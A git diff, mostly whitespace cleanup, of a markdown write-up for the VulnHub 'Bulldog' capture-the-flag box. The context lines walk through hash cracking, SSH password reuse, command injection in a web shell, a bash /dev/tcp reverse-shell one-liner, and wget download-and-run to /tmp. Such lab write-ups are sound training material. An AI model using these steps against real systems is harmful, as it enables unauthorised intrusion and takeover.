@@ -15,7 +15,7 @@ You can find it [here](https://www.vulnhub.com/entry/bulldog-1,211/) at https://
 
 Here is the description by the author:
 
-_Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)_ 
+_Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)_
 
 After their hack by the BlackHat German Shepherds, Bulldog Industries has brought us in to find the rest of the vulnerabilities. They will be happy they did!
 
@@ -28,7 +28,7 @@ I liked this box for several reasons:
 * It sticks to the basics while still providing an interesting challenge.
 * There is an attempt to create a real-world context.
 
- 
+
 This write up assumes the reader is using Kali, but all the tools are standard (unless mentioned) in distros like BlackArch as well – except for [dirsearch](https://github.com/maurosoria/dirsearch), but you can use dirb or dirbuster as replacements if you like.
 I ran it on my native Kali host machine using VirtualBox; on a host-only network.
 
@@ -147,7 +147,7 @@ Let’s check on the big dirsearch list and see if caught anything new.
 ![A8 – big dirsearch result](https://i.imgur.com/dMSc5Iz.png)
 
 
-Doesn’t look like it. /notice is new, but that’s the page we are looking at. If we get stuck later we can try dirsearching again and adding `-f` or `-r` to force extensions and search recursively. 
+Doesn’t look like it. /notice is new, but that’s the page we are looking at. If we get stuck later we can try dirsearching again and adding `-f` or `-r` to force extensions and search recursively.
 
 Alright, let’s dive into the manual scan, armed with our list of /dev, /admin and /robots.txt. I like to start with robots.txt, since it might contain info that our scans couldn’t access.
 
@@ -185,7 +185,7 @@ I like a CTF with an attempt to create real-world context. This is full of usefu
 
 
 
-My next goal is to access that Web-Shell, and exploit it. Before I do that, I’ll need to appear like I have logged in. 
+My next goal is to access that Web-Shell, and exploit it. Before I do that, I’ll need to appear like I have logged in.
 
 
 ## 3. Logging into the Website
@@ -195,7 +195,7 @@ Let’s check out that /admin page
 ![A12 – admin page](https://i.imgur.com/7uC9fyH.png)
 
 
-We have a list of many usernames, so technically we can assume we are halfway to a valid set of login credentials. We have emails, but I don’t think any of them will respond to any phishing attempts. 
+We have a list of many usernames, so technically we can assume we are halfway to a valid set of login credentials. We have emails, but I don’t think any of them will respond to any phishing attempts.
 
 
 We’ve been told that the site uses Django for everything, and this is also announced at the top of the page. This suggests SQL Injection isn’t going to be helpful here.
@@ -232,7 +232,7 @@ but I want to maybe not just identify the hash format, but crack it at the same 
 Okay, we have SHA1, but it didn’t crack. Luckily, we have many hashes to choose from. We can try them all. For best results, let’s run them through John the Ripper and then check them in HashBuster while that is running.
 
 
-I’m going to use my own wordlist here, my commonly used Top32Million-probable.txt that you can find in my [Probable-Wordlists Repo](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords) – this particular list can’t be downloaded from GitHub directly, but torrents and MegaUpload links are provided. 
+I’m going to use my own wordlist here, my commonly used Top32Million-probable.txt that you can find in my [Probable-Wordlists Repo](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords) – this particular list can’t be downloaded from GitHub directly, but torrents and MegaUpload links are provided.
 
 
 You don’t HAVE to use that wordlist, but I had more success with it than the default option. For honesty’s sake, I’ll mention that rockyou works well too.
@@ -251,7 +251,7 @@ Somehow, I don’t find those results surprising. We do have two FULL login cred
 
 
 
-We COULD try them on the website login, where we know they will probably work, but people reuse passwords all the time. The client has not closed SSH yet, so let’s try there! 
+We COULD try them on the website login, where we know they will probably work, but people reuse passwords all the time. The client has not closed SSH yet, so let’s try there!
 
 
 * `ssh nick@bulldog.ctf -p 23` - and his password
@@ -308,7 +308,7 @@ Let’s try something like `;`
 
 
 
-Oh no! The internet police are coming after me! 
+Oh no! The internet police are coming after me!
 
 
 
@@ -334,7 +334,7 @@ Let’s see if we can use this to run a reverse shell. I have had mixed success 
 * `bash -i >& /dev/tcp/local.machine.ip.addr/PORTNUM 0>&1`
 
 
-Which we need to run after `pwd` or one of the other commands – after we have set up our listener of course. 
+Which we need to run after `pwd` or one of the other commands – after we have set up our listener of course.
 
 On our local machine, we run:
 
@@ -356,7 +356,7 @@ My go-to method to get around this is to write a script containing the more comp
 * Downloading the script to a writable directory, then making it executable and running it.
 
 
-This last part usually uses `wget`-to donwload the script to a writable directory like /tmp and then running `chmod +x script.sh` and `bash script.sh` - so, we need do check if our user can run these commands. 
+This last part usually uses `wget`-to donwload the script to a writable directory like /tmp and then running `chmod +x script.sh` and `bash script.sh` - so, we need do check if our user can run these commands.
 
 
 In the webshell, we run
@@ -441,7 +441,7 @@ A note? Could this be our `AdminPassNoHackersPlz.txt` file?
 ![A27 – hidden admindir](https://i.imgur.com/nBgsPUX.png)
 
 
-*"...the webserver is the… …one who needs to have root access..."* is all I needed to hear to get me interested. Right now, we are running as the webserver, and root access would be just lovely. 
+*"...the webserver is the… …one who needs to have root access..."* is all I needed to hear to get me interested. Right now, we are running as the webserver, and root access would be just lovely.
 
 
 The other lines that got my attention were *"Once I’m finished with it, a hacker wouldn’t even be able to reverse it,"* and *"…it’s still a prototype right now."*
@@ -483,7 +483,7 @@ The first thing I noticed was *"sudo su root"* at the bottom. This command doesn
 *"sudo su"* also requires a password, but the line *"Usage: ./customPermissionApp <username>"* doesn’t appear to even ask for one. The note did mention that it only worked for the Django user, too. Could this mean that the password for the Django user is contained within this file?
 
 
-We should read the whole file to try to find something, but let’s start with the section we are already looking at. 
+We should read the whole file to try to find something, but let’s start with the section we are already looking at.
 
 
 ![A30 – supergood](https://i.imgur.com/0NqcoBh.png)
@@ -534,5 +534,5 @@ Looking forward to the sequel!
 
 
 
-
- 
+<br>
+[Main Page](index.md)
